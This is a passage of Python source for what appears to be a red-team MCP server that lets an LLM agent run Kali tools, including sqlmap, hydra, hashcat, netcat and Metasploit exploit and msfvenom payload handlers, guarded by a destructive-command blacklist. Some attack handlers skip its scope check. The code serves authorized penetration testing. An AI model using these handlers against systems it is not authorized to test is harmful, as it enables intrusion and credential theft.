        elif tool_name in self._BRUTE_TOOLS:
            _add("interpretation/auth.md")
        elif tool_name in self._HASH_TOOLS:
            _add("interpretation/auth.md")

        # --- Layer 3: result-based triggers ---
        if scan_results:
            results_lower = scan_results[:5000].lower()  # only scan first 5k chars
            if "login" in results_lower or "auth" in results_lower:
                _add("interpretation/auth.md")
            if "version" in results_lower:
                _add("tools/searchsploit.md")

        if not sections:
            return ""

        context_body = self._truncate_to_budget(sections)
        est_tokens = len(context_body) // int(self._CHARS_PER_TOKEN)
        self._log.debug(
            "Knowledge injected for '%s': %d files, ~%d tokens",
            tool_name, len(loaded_files), est_tokens,
        )
        constraints = (
            "\n---\n"
            "CONSTRAINTS:\n"
            "- You may ONLY report findings listed in the "
            "[EVIDENCE GATE] block. Do not infer, extrapolate, or fabricate "
            "additional vulnerabilities beyond what is explicitly confirmed. "
            "If EVIDENCE GATE says NO_FINDINGS=true, state: "
            "'No confirmed vulnerability. No verifiable evidence produced.' "
            "Recommendations must use conditional language "
            "('could test', 'may attempt').\n"
            "- LANGUAGE: Always respond in the SAME language the user is "
            "writing in. If the user writes in Spanish, your entire response "
            "must be in Spanish. If in English, respond in English. "
            "Only technical terms (tool names, CVEs, parameters, commands) "
            "stay in English.\n"
        )
        return (
            f"[TACTICAL CONTEXT — {tool_name}]\n"
            f"{context_body}\n"
            f"{constraints}"
            f"[END TACTICAL CONTEXT]\n"
        )


# ---------------------------------------------------------------------------
# Tool executor
# ---------------------------------------------------------------------------

class ToolExecutor:
    """Execute Kali Linux tools as async subprocesses."""

    _SHELL_WHITELIST = {
        "ping", "traceroute", "tracert", "curl", "wget", "host", "nslookup",
        "arp", "ip", "ifconfig", "netstat", "ss", "route", "cat", "ls", "head",
        "tail", "wc", "grep", "awk", "sed", "cut", "sort", "uniq", "file",
        "xxd", "base64", "md5sum", "sha256sum", "openssl", "certutil",
    }

    _SHELL_BLACKLIST_PATTERNS = [
        r"\brm\s+(-rf?|--recursive)", r"\bmkfs\b", r"\bdd\b\s+if=",
        r"\b(shutdown|reboot|halt|poweroff)\b", r"\bchmod\s+777",
        r">\s*/etc/", r">\s*/dev/", r"\bsudo\b", r"\bsu\s",
        r"\biptables\b.*-F", r"\bsystemctl\s+(stop|disable)",
    ]

    def __init__(self, config: dict, logger: logging.Logger,
                 audit: AuditLogger, scan_db: ScanDatabase) -> None:
        self._config = config
        self._log = logger
        self._audit = audit
        self._db = scan_db
        self._tools_cfg = config.get("tools", {})
        self._security_cfg = config.get("security", {})
        self._default_timeout: int = self._tools_cfg.get("default_timeout", 120)
        self._max_timeout: int = self._security_cfg.get("max_command_timeout", 300)
        self._allowed_scope: list[str] = self._security_cfg.get("allowed_scope", [])
        self._require_scope: bool = self._security_cfg.get("require_scope_check", True)
        self._resolve_dns: bool = self._security_cfg.get("resolve_hostnames", True)

        # [MEJORA 2] Risk level classification - Actualizado con nuevas herramientas
        risk_cfg = config.get("risk_levels", {})
        self._high_risk_tools: set[str] = set(risk_cfg.get("high", [
            # Herramientas existentes de alto riesgo
            "sqlmap_scan", "hydra_attack", "hashcat_crack", "john_crack",
            # Nuevas herramientas de alto riesgo
            "msf_console", "msfvenom", "metasploit_resource", "bettercap_scan",
            "responder_poison", "crackmapexec", "impacket_scripts", "bloodhound_enum",
            "mimikatz", "setoolkit", "beef_start", "ettercap_mitm", "aircrack_suite",
            "wifite_audit", "medusa_bruteforce", "ncrack_bruteforce", "wpscan",
            "zap_scan"
        ]))

        # [MEJORA 5] Rate limiting
        rate_cfg = config.get("rate_limit", {})
        global_max = rate_cfg.get("global_max_concurrent", 3)
        per_tool_max = rate_cfg.get("per_tool_max_concurrent", 1)
        self._global_semaphore = asyncio.Semaphore(global_max)
        self._tool_semaphores: dict[str, asyncio.Semaphore] = {}
        self._per_tool_max = per_tool_max

    def _get_tool_semaphore(self, tool_name: str) -> asyncio.Semaphore:
        if tool_name not in self._tool_semaphores:
            self._tool_semaphores[tool_name] = asyncio.Semaphore(self._per_tool_max)
        return self._tool_semaphores[tool_name]

    async def execute(self, tool_name: str, arguments: dict) -> dict:
        """Dispatch *tool_name* to the appropriate handler with rate limiting."""
        handler = getattr(self, f"_tool_{tool_name}", None)
        if handler is None:
            return self._error(f"Unknown tool: {tool_name}")

        # [MEJORA 2] Warn for high-risk tools via stderr
        if tool_name in self._high_risk_tools:
            self._log.warning(
                "HIGH RISK TOOL: %s called with args: %s",
                tool_name, json.dumps(arguments)[:300]
            )
            print(
                f"\n[WARNING] HIGH-RISK tool '{tool_name}' is being executed.\n"
                f"  Arguments: {json.dumps(arguments, indent=2)[:500]}\n",
                file=sys.stderr, flush=True,
            )

        # [MEJORA 5] Rate limiting with semaphores
        tool_sem = self._get_tool_semaphore(tool_name)
        try:
            async with self._global_semaphore:
                async with tool_sem:
                    result = await handler(arguments)

            # Determine target for DB storage
            target = (arguments.get("target") or arguments.get("target_url")
                      or arguments.get("query") or "unknown")

            # [MEJORA 6] Save to database
            output_text = ""
            parsed_text = None
            if result.get("content"):
                output_text = result["content"][0].get("text", "")
                # Check if it's already JSON
                try:
                    json.loads(output_text)
                    parsed_text = output_text
                except (json.JSONDecodeError, TypeError):
                    pass

            self._db.save_result(
                tool=tool_name,
                target=str(target),
                arguments=arguments,
                output=output_text,
                output_parsed=parsed_text,
                success=not result.get("isError", False),
            )

            self._audit.log(tool_name, arguments, output_text[:200], True)
            return result

        except ValueError as exc:
            msg = f"Input validation error: {exc}"
            self._audit.log(tool_name, arguments, msg, False)
            return self._error(msg)
        except asyncio.TimeoutError:
            timeout_secs = self._timeout_for(tool_name)
            msg = (
                f"Tool {tool_name} timed out after {timeout_secs}s. "
                f"Execution incomplete. No verifiable results."
            )
            self._audit.log(tool_name, arguments, msg, False)
            return self._error(msg)
        except Exception as exc:
            msg = (
                f"Unexpected error in {tool_name}: {exc}. "
                f"Execution incomplete. No verifiable results."
            )
            self._log.exception(msg)
            self._audit.log(tool_name, arguments, msg, False)
            return self._error(msg)

    # -- helpers -------------------------------------------------------------

    @staticmethod
    def _error(message: str) -> dict:
        return {"content": [{"type": "text", "text": message}], "isError": True}

    @staticmethod
    def _ok(text: str) -> dict:
        return {"content": [{"type": "text", "text": text}], "isError": False}

    def _timeout_for(self, tool_name: str) -> int:
        tool_cfg = self._tools_cfg.get(tool_name, {})
        if isinstance(tool_cfg, dict):
            t = tool_cfg.get("timeout", self._default_timeout)
        else:
            t = self._default_timeout
        return min(t, self._max_timeout)

    def _scope_check(self, target: str) -> None:
        """Raise ValueError if the target is outside the allowed scope."""
        if self._require_scope and self._allowed_scope:
            # [MEJORA 1] Pass resolve_dns flag
            if not InputSanitizer.check_scope(target, self._allowed_scope, self._resolve_dns):
                raise ValueError(
                    f"Target {target!r} is outside the allowed scope. "
                    f"Allowed: {self._allowed_scope}"
                )

    async def _run_subprocess(self, cmd: list[str], timeout: int) -> tuple[str, str, int]:
        """Run *cmd* as an async subprocess, returning (stdout, stderr, returncode)."""
        self._log.info("Executing: %s (timeout=%ds)", " ".join(cmd), timeout)
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise
        stdout = stdout_bytes.decode("utf-8", errors="replace")
        stderr = stderr_bytes.decode("utf-8", errors="replace")
        return stdout, stderr, proc.returncode or 0

    # -- tool implementations ------------------------------------------------

    async def _tool_nmap_scan(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)

        scan_type = args.get("scan_type", "quick")
        timing = args.get("timing", "T3")
        ports = args.get("ports", "")
        scripts = args.get("scripts", "")
        extra = args.get("extra_args", "")

        scan_flags = {
            "quick":     ["-sS", "-sV", "--top-ports", "1000"],
            "full":      ["-sS", "-sV", "-sC", "-p-"],
            "stealth":   ["-sS", "-sV"],
            "vuln":      ["-sS", "-sV", "--script", "vuln"],
            "scripts":   ["-sS", "-sV", "-sC"],
            "discovery": ["-sn"],
            "udp":       ["-sU", "--top-ports", "50"],
        }.get(scan_type, ["-sS", "-sV"])

        # Bug 3: if ports is specified (or extra_args contains -p), strip conflicting
        # scan_type flags (-p- and --top-ports N) so nmap doesn't get two -p options.
        flags = list(scan_flags)
        has_port_conflict = bool(ports) or bool(extra and re.search(r'(?<!\w)-p[ \-]', extra))
        if has_port_conflict:
            clean: list[str] = []
            skip_next = False
            for f in flags:
                if skip_next:
                    skip_next = False
                    continue
                if f == "-p-":
                    continue
                if f == "--top-ports":
                    skip_next = True
                    continue
                clean.append(f)
            flags = clean

        cmd: list[str] = ["nmap"] + flags + [f"-{timing}"]

        # discovery mode: no ports, no scripts
        if scan_type != "discovery":
            if ports:
                cmd += ["-p", InputSanitizer.sanitize_generic(ports)]
            if scripts and scan_type not in ("vuln",):
                cmd += ["--script", InputSanitizer.sanitize_generic(scripts)]

        if extra:
            try:  # Bug 4: shlex.split raises ValueError on unbalanced quotes
                cmd += shlex.split(InputSanitizer.sanitize_generic(extra))
            except ValueError as e:
                return self._error(f"Invalid extra_args: {e}")

        cmd += [target, "-oX", "-"]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("nmap"))

        parsed = OutputParsers.parse_nmap_xml(stdout)
        if parsed:
            return self._ok(json.dumps(parsed, indent=2))

        # Bug 5: surface stderr when nmap exits non-zero so the LLM sees the real error
        if rc != 0:
            return self._ok(f"[NMAP ERROR rc={rc}]:\n{stderr}\n{stdout}".strip())
        return self._ok(stdout if stdout else stderr)

    async def _tool_nikto_scan(self, args: dict) -> dict:
        url = InputSanitizer.sanitize_url(args["target_url"])
        tuning = args.get("tuning", "")
        max_time = args.get("max_time", 0)
        extra = args.get("extra_args", "")

        cmd = ["nikto", "-h", url]
        if tuning:
            cmd += ["-Tuning", InputSanitizer.sanitize_generic(tuning)]
        if max_time and max_time > 0:
            cmd += ["-maxtime", str(int(max_time))]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        timeout = min(max_time, self._max_timeout) if max_time > 0 else self._timeout_for("nikto")
        stdout, stderr, rc = await self._run_subprocess(cmd, timeout)

        raw = stdout if stdout else stderr
        # [MEJORA 3] Parse nikto output
        parsed = OutputParsers.parse_nikto(raw)
        if parsed:
            return self._ok(json.dumps(parsed, indent=2))
        return self._ok(raw)

    async def _tool_gobuster_dir(self, args: dict) -> dict:
        url = InputSanitizer.sanitize_url(args["target_url"])
        wordlist = InputSanitizer.sanitize_path(args.get("wordlist", "/usr/share/wordlists/dirb/common.txt"))
        extensions = args.get("extensions", "")
        threads = args.get("threads", 10)
        status_codes = args.get("status_codes", "")

        cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", str(int(threads))]
        if extensions:
            cmd += ["-x", InputSanitizer.sanitize_generic(extensions)]
        if status_codes:
            cmd += ["-s", InputSanitizer.sanitize_generic(status_codes)]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("gobuster"))

        raw = stdout if stdout else stderr
        # [MEJORA 3] Parse gobuster output
        parsed = OutputParsers.parse_gobuster(raw)
        if parsed:
            return self._ok(json.dumps(parsed, indent=2))
        return self._ok(raw)

    async def _tool_sqlmap_scan(self, args: dict) -> dict:
        url = InputSanitizer.sanitize_url(args["target_url"])
        data = args.get("data", "")
        method = args.get("method", "GET")
        level = max(1, min(5, int(args.get("level", 1))))
        risk = max(1, min(3, int(args.get("risk", 1))))
        tamper = args.get("tamper", "")
        extra = args.get("extra_args", "")

        cmd = ["sqlmap", "-u", url, "--batch", f"--level={level}", f"--risk={risk}"]
        if method == "POST" and data:
            cmd += ["--data", InputSanitizer.sanitize_generic(data)]
        if tamper:
            cmd += ["--tamper", InputSanitizer.sanitize_generic(tamper)]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("sqlmap"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_hydra_attack(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)

        service = InputSanitizer.sanitize_generic(args["service"])
        password_list = InputSanitizer.sanitize_path(args["password_list"])
        username = args.get("username", "")
        username_list = args.get("username_list", "")
        port = args.get("port")
        threads = args.get("threads", 4)
        extra = args.get("extra_args", "")

        cmd = ["hydra"]
        if username:
            cmd += ["-l", InputSanitizer.sanitize_generic(username)]
        elif username_list:
            cmd += ["-L", InputSanitizer.sanitize_path(username_list)]
        else:
            cmd += ["-l", "admin"]

        cmd += ["-P", password_list]
        if port:
            cmd += ["-s", str(int(port))]
        cmd += ["-t", str(int(threads))]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))
        cmd += [target, service]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("hydra"))

        raw = stdout if stdout else stderr
        # [MEJORA 3] Parse hydra output
        parsed = OutputParsers.parse_hydra(raw)
        if parsed:
            combined = json.dumps(parsed, indent=2) + "\n\n--- Raw Output ---\n" + raw
            return self._ok(combined)
        return self._ok(raw)

    async def _tool_enum4linux_scan(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)
        options = args.get("options", "all")

        flag_map = {
            "all": "-a", "users": "-U", "shares": "-S",
            "policies": "-P", "groups": "-G",
        }
        flag = flag_map.get(options, "-a")

        cmd = ["enum4linux", flag, target]
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("enum4linux"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_wfuzz_scan(self, args: dict) -> dict:
        url = args["target_url"].strip()
        if "FUZZ" not in url:
            return self._error("target_url must contain the 'FUZZ' keyword.")
        wordlist = InputSanitizer.sanitize_path(args["wordlist"])
        hide_codes = args.get("hide_codes", "404")
        hide_chars = args.get("hide_chars", "")
        extra = args.get("extra_args", "")

        cmd = ["wfuzz", "-w", wordlist, "--hc", InputSanitizer.sanitize_generic(hide_codes)]
        if hide_chars:
            cmd += ["--hh", InputSanitizer.sanitize_generic(hide_chars)]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))
        cmd.append(url)

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("wfuzz"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_netcat_connect(self, args: dict) -> dict:
        port = int(args["port"])
        mode = args.get("mode", "connect")
        target = args.get("target", "")
        extra = args.get("extra_args", "")

        if mode == "listen":
            cmd = ["nc", "-lvnp", str(port)]
        else:
            if not target:
                return self._error("Target is required in connect mode.")
            target = InputSanitizer.sanitize_target(target)
            self._scope_check(target)
            cmd = ["nc", target, str(port)]

        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        timeout = min(30, self._max_timeout)
        stdout, stderr, rc = await self._run_subprocess(cmd, timeout)
        return self._ok(stdout if stdout else stderr)

    async def _tool_searchsploit_query(self, args: dict) -> dict:
        query = InputSanitizer.sanitize_generic(args["query"])
        exact = args.get("exact", False)
        json_output = args.get("json_output", True)

        cmd = ["searchsploit"]
        if exact:
            cmd.append("--exact")
        if json_output:
            cmd.append("--json")
        cmd += shlex.split(query)

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("searchsploit"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_hashcat_crack(self, args: dict) -> dict:
        hash_file = InputSanitizer.sanitize_path(args["hash_file"])
        hash_type = int(args["hash_type"])
        wordlist = InputSanitizer.sanitize_path(args["wordlist"])
        rules = args.get("rules", "")
        extra = args.get("extra_args", "")

        cmd = ["hashcat", "-m", str(hash_type), hash_file, wordlist, "--force"]
        if rules:
            cmd += ["-r", InputSanitizer.sanitize_path(rules)]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("hashcat"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_john_crack(self, args: dict) -> dict:
        hash_file = InputSanitizer.sanitize_path(args["hash_file"])
        wordlist = args.get("wordlist", "")
        fmt = args.get("format", "")
        extra = args.get("extra_args", "")

        cmd = ["john"]
        if wordlist:
            cmd.append(f"--wordlist={InputSanitizer.sanitize_path(wordlist)}")
        if fmt:
            cmd.append(f"--format={InputSanitizer.sanitize_generic(fmt)}")
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))
        cmd.append(hash_file)

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("john"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_dirb_scan(self, args: dict) -> dict:
        url = InputSanitizer.sanitize_url(args["target_url"])
        wordlist = InputSanitizer.sanitize_path(args.get("wordlist", "/usr/share/wordlists/dirb/common.txt"))
        extra = args.get("extra_args", "")

        cmd = ["dirb", url, wordlist]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("dirb"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_whatweb_scan(self, args: dict) -> dict:
        url = InputSanitizer.sanitize_url(args["target_url"])
        aggression = args.get("aggression", "1")
        extra = args.get("extra_args", "")

        cmd = ["whatweb", "-a", str(aggression), url]
        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("whatweb"))

        raw = stdout if stdout else stderr
        # [MEJORA 3] Parse whatweb output
        parsed = OutputParsers.parse_whatweb(raw)
        if parsed:
            return self._ok(json.dumps(parsed, indent=2))
        return self._ok(raw)

    async def _tool_whois_lookup(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        cmd = ["whois", target]
        stdout, stderr, rc = await self._run_subprocess(cmd, self._default_timeout)
        return self._ok(stdout if stdout else stderr)

    async def _tool_dig_lookup(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        record_type = args.get("record_type", "A")
        server = args.get("server", "")

        cmd = ["dig", target, record_type]
        if server:
            cmd.append(f"@{InputSanitizer.sanitize_target(server)}")

        stdout, stderr, rc = await self._run_subprocess(cmd, self._default_timeout)
        return self._ok(stdout if stdout else stderr)

    async def _tool_shell_command(self, args: dict) -> dict:
        raw_command = args.get("command", "").strip()
        if not raw_command:
            return self._error("No command provided.")

        for pattern in self._SHELL_BLACKLIST_PATTERNS:
            if re.search(pattern, raw_command, re.IGNORECASE):
                return self._error("Command blocked by security policy: matches blacklisted pattern.")

        try:
            parts = shlex.split(raw_command)
        except ValueError as exc:
            return self._error(f"Failed to parse command: {exc}")

        if not parts:
            return self._error("Empty command.")

        base_cmd = Path(parts[0]).name
        if base_cmd not in self._SHELL_WHITELIST:
            return self._error(
                f"Command {base_cmd!r} is not in the whitelist. "
                f"Allowed: {', '.join(sorted(self._SHELL_WHITELIST))}"
            )

        stdout, stderr, rc = await self._run_subprocess(parts, self._default_timeout)
        output = stdout if stdout else stderr
        return self._ok(f"[exit code {rc}]\n{output}")

    # [MEJORA 6] Scan history tool
    async def _tool_get_scan_history(self, args: dict) -> dict:
        tool = args.get("tool")
        target = args.get("target")
        limit = args.get("limit", 20)
        history = self._db.get_history(tool=tool, target=target, limit=limit)

        if not history:
            return self._ok("No scan history found for the given filters.")

        # Return summary without full output (too long)
        summary = []
        for entry in history:
            summary.append({
                "id": entry["id"],
                "tool": entry["tool"],
                "target": entry["target"],
                "success": bool(entry["success"]),
                "timestamp": entry["timestamp"],
                "has_parsed_output": entry.get("output_parsed") is not None,
            })
        return self._ok(json.dumps(summary, indent=2))

    # [MEJORA 8] Report generation tool
    async def _tool_generate_report(self, args: dict) -> dict:
        target_filter = args.get("target")
        results = self._db.get_results_for_report(target=target_filter)

        if not results:
            return self._ok("No scan results found to generate a report.")

        # Load evidence verdicts keyed by scan_id
        verdicts = self._db.get_verdicts_for_report(target=target_filter)

        # Build markdown report
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        confirmed_count = sum(1 for v in verdicts.values() if v.get("has_findings"))
        unconfirmed_count = len(results) - confirmed_count

        report_lines = [
            "# Red Team Scan Report",
            f"**Generated:** {now}",
            f"**Filter:** {target_filter or 'All targets'}",
            f"**Total scans:** {len(results)}",
            f"**Confirmed findings:** {confirmed_count}",
            f"**Unconfirmed / Informational:** {unconfirmed_count}",
            "",
            "> **Evidence Policy:** Only scans with machine-verified evidence "
            "are marked CONFIRMED. All other results are UNCONFIRMED / Informational.",
            "",
            "---",
            "",
        ]

        # Group by target
        by_target: dict[str, list[dict]] = {}
        for r in results:
            by_target.setdefault(r["target"], []).append(r)

        for target, scans in by_target.items():
            report_lines.append(f"## Target: `{target}`")
            report_lines.append("")

            for scan in scans:
                scan_id = scan["id"]
                v = verdicts.get(scan_id)
                if v and v.get("has_findings"):
                    evidence_label = "CONFIRMED"
                    evidence_type = v.get("evidence_type", "unknown")
                    finding_count = v.get("finding_count", 0)
                    badge = f"**[{evidence_label}]** (evidence: {evidence_type}, count: {finding_count})"
                elif v and v.get("execution_status") in ("timeout", "error"):
                    badge = "**[INCOMPLETE]** Execution did not finish — no verifiable results"
                else:
                    badge = "**[UNCONFIRMED / Informational]** No machine-verified evidence"

                report_lines.append(f"### {scan['tool']} (ID: {scan_id})")
                report_lines.append(f"- **Time:** {scan['timestamp']}")
                report_lines.append(f"- **Status:** {'OK' if scan['success'] else 'FAILED'}")
                report_lines.append(f"- **Evidence:** {badge}")

                # Show verified fact summary from verdict
                if v and v.get("has_findings"):
                    summary_raw = v.get("finding_summary", "[]")
                    try:
                        summary_list = json.loads(summary_raw) if isinstance(summary_raw, str) else summary_raw
                    except (json.JSONDecodeError, TypeError):
                        summary_list = []
                    if summary_list:
                        report_lines.append("- **Verified facts:**")
                        for fact in summary_list[:15]:
                            report_lines.append(f"  - {fact}")

                report_lines.append("")

                # Use parsed output if available, otherwise truncate raw
                if scan.get("output_parsed"):
                    try:
                        parsed = json.loads(scan["output_parsed"])
                        report_lines.append("```json")
                        report_lines.append(json.dumps(parsed, indent=2)[:3000])
                        report_lines.append("```")
                    except json.JSONDecodeError:
                        report_lines.append("```")
                        report_lines.append(scan["output"][:2000])
                        report_lines.append("```")
                else:
                    output = scan["output"][:2000]
                    if output:
                        report_lines.append("```")
                        report_lines.append(output)
                        report_lines.append("```")

                report_lines.append("")

        report_lines.append("---")
        report_lines.append(
            "*Report generated by Red Team MCP Server v2.0 — "
            "Evidence validation layer active*"
        )

        report_text = "\n".join(report_lines)

        # Save to file
        report_dir = Path(self._config.get("server", {}).get("report_dir", "reports"))
        report_dir.mkdir(parents=True, exist_ok=True)
        filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        report_path = report_dir / filename
        report_path.write_text(report_text, encoding="utf-8")

        return self._ok(
            f"Report saved to: {report_path}\n\n{report_text}"
        )

    # [MEJORA 7] Auto-recon workflow
    async def _tool_auto_recon(self, args: dict) -> dict:
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)

        ports = args.get("ports", "")
        web_ports_str = args.get("web_ports", "80,443,8080,8443")
        wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        web_ports = [int(p.strip()) for p in web_ports_str.split(",") if p.strip().isdigit()]

        recon_report: dict[str, Any] = {
            "target": target,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "phases": {},
        }

        # Phase 1: WHOIS
        self._log.info("[auto_recon] Phase 1: WHOIS for %s", target)
        try:
            whois_result = await self._tool_whois_lookup({"target": target})
            recon_report["phases"]["whois"] = whois_result["content"][0]["text"][:2000]
        except Exception as exc:
            recon_report["phases"]["whois"] = f"Error: {exc}"

        # Phase 2: DNS
        self._log.info("[auto_recon] Phase 2: DNS for %s", target)
        try:
            dig_result = await self._tool_dig_lookup({"target": target, "record_type": "A"})
            recon_report["phases"]["dns_A"] = dig_result["content"][0]["text"][:1000]
        except Exception as exc:
            recon_report["phases"]["dns_A"] = f"Error: {exc}"

        # Phase 3: Nmap scan
        self._log.info("[auto_recon] Phase 3: Nmap for %s", target)
        try:
            nmap_args = {"target": target, "scan_type": "quick", "timing": "T4"}
            if ports:
                nmap_args["ports"] = ports
            nmap_result = await self._tool_nmap_scan(nmap_args)
            nmap_output = nmap_result["content"][0]["text"]
            recon_report["phases"]["nmap"] = nmap_output[:5000]

            # Detect web ports from nmap results
            open_web_ports = []
            try:
                nmap_data = json.loads(nmap_output)
                for host in nmap_data.get("hosts", []):
                    for port_info in host.get("ports", []):
                        if port_info.get("state") == "open":
                            port_num = int(port_info["port"])
                            svc = port_info.get("service", "")
                            if port_num in web_ports or svc in ("http", "https", "http-proxy", "http-alt"):
                                scheme = "https" if port_num == 443 or "ssl" in svc or "https" in svc else "http"
                                open_web_ports.append((scheme, port_num))
            except (json.JSONDecodeError, KeyError, ValueError):
                # Fallback: assume 80 and 443 might be open
                open_web_ports = [("http", 80), ("https", 443)]

        except Exception as exc:
            recon_report["phases"]["nmap"] = f"Error: {exc}"
            open_web_ports = []

        # Phase 4: WhatWeb on discovered web ports
        if open_web_ports:
            self._log.info("[auto_recon] Phase 4: WhatWeb on %d web ports", len(open_web_ports))
            for scheme, port in open_web_ports[:3]:  # max 3 ports
                url = f"{scheme}://{target}:{port}" if port not in (80, 443) else f"{scheme}://{target}"
                try:
                    ww_result = await self._tool_whatweb_scan({"target_url": url, "aggression": "1"})
                    recon_report["phases"][f"whatweb_{port}"] = ww_result["content"][0]["text"][:2000]
                except Exception as exc:
                    recon_report["phases"][f"whatweb_{port}"] = f"Error: {exc}"

            # Phase 5: Gobuster on first web port
            self._log.info("[auto_recon] Phase 5: Gobuster")
            scheme, port = open_web_ports[0]
            url = f"{scheme}://{target}:{port}" if port not in (80, 443) else f"{scheme}://{target}"
            try:
                gb_result = await self._tool_gobuster_dir({
                    "target_url": url,
                    "wordlist": wordlist,
                    "threads": 10,
                })
                recon_report["phases"]["gobuster"] = gb_result["content"][0]["text"][:5000]
            except Exception as exc:
                recon_report["phases"]["gobuster"] = f"Error: {exc}"
        else:
            recon_report["phases"]["web_scan"] = "No web ports detected - skipping whatweb and gobuster."

        return self._ok(json.dumps(recon_report, indent=2))

    # ========= NUEVOS HANDLERS PARA HERRAMIENTAS DE PENETRACIÓN =========

    async def _tool_msf_console(self, args: dict) -> dict:
        """Ejecutar comandos en Metasploit"""
        # Validation: Ensure exactly one of resource_script or commands is provided
        has_resource_script = "resource_script" in args and args["resource_script"] is not None
        has_commands = "commands" in args and args["commands"] is not None

        if not has_resource_script and not has_commands:
            return self._error("Error: Debe proporcionar 'resource_script' o 'commands', pero no ambos ni ninguno.")

        if has_resource_script and has_commands:
            return self._error("Error: No puede proporcionar ambos 'resource_script' y 'commands' al mismo tiempo. Proporcione solo uno.")

        workspace = args.get("workspace", "default")

        # Crear script resource temporal si se proporcionan comandos
        if has_commands:
            rc_content = f"workspace {workspace}\n"
            rc_content += "\n".join(args["commands"])
            rc_file = f"/tmp/msf_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
            with open(rc_file, "w") as f:
                f.write(rc_content)
            cmd = ["msfconsole", "-q", "-r", rc_file]
        else:  # has_resource_script
            cmd = ["msfconsole", "-q", "-r", args["resource_script"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)  # 5 minutos de timeout
        output = stdout if stdout else stderr
        
        # Parsear resultados para extraer información útil
        sessions = re.findall(r"Meterpreter session (\d+) opened", output)
        if sessions:
            output += f"\n[+] Sesiones Meterpreter abiertas: {', '.join(sessions)}"
        
        return self._ok(output)

    async def _tool_msfvenom(self, args: dict) -> dict:
        """Generar payloads con MSFVenom"""
        payload = args["payload"]
        lhost = args["lhost"]
        lport = args["lport"]
        fmt = args["format"]
        output_file = args.get("output_file", f"payload.{fmt}")
        
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output_file]
        
        if args.get("encoder"):
            cmd += ["-e", args["encoder"], "-i", str(args.get("iterations", 1))]
        if args.get("platform"):
            cmd += ["--platform", args["platform"]]
        if args.get("arch"):
            cmd += ["-a", args["arch"]]
        if args.get("badchars"):
            cmd += ["-b", args["badchars"]]
        if args.get("extra_args"):
            cmd += shlex.split(args["extra_args"])
        
        stdout, stderr, rc = await self._run_subprocess(cmd, 60)
        
        if rc == 0:
            result = f"[+] Payload generado exitosamente: {output_file}\n"
            result += f"[+] Tamaño: {os.path.getsize(output_file)} bytes\n"
            result += stdout
            return self._ok(result)
        else:
            return self._ok(stdout if stdout else stderr)

    async def _tool_metasploit_resource(self, args: dict) -> dict:
        """Crear y ejecutar scripts resource de Metasploit"""
        name = args["name"]
        commands = args.get("commands", [])
        exploit_module = args.get("exploit_module")
        payload = args.get("payload")
        options = args.get("options", {})
        
        rc_content = ""
        
        if exploit_module:
            rc_content += f"use {exploit_module}\n"
            for key, value in options.items():
                rc_content += f"set {key} {value}\n"
            if payload:
                rc_content += f"set PAYLOAD {payload}\n"
            if args.get("run"):
                rc_content += "run\n"
        
        if commands:
            rc_content += "\n".join(commands)
        
        rc_file = f"/tmp/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
        with open(rc_file, "w") as f:
            f.write(rc_content)
        
        cmd = ["msfconsole", "-q", "-r", rc_file]
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)
        
        return self._ok(stdout if stdout else stderr)

    async def _tool_crackmapexec(self, args: dict) -> dict:
        """Ejecutar CrackMapExec"""
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)
        
        protocol = args.get("protocol", "smb")
        cmd = ["crackmapexec", protocol, target]
        
